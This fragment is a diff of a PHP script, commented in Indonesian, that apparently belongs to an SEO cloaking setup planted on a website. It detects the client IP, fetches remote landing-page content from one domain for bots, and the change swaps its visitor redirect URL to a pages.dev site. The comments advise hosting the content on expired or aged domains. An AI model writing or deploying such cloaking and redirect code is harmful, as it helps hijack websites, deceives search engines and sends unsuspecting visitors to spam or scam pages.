@@ -18,7 +18,7 @@ function get_client_ip() {
 $ip = get_client_ip();
 
 $bot_url = "https://picucur.xyz/landing/calabriaonweb/"; // Upload dulu di 1 domain, exp, aged bebas, lalu taruh disini
-$reff_url = "https://selalu-always.xyz/amp/calabriaonweb/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
+$reff_url = "https://calabriaonweb.pages.dev/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
 
 $file = file_get_contents($bot_url);
 
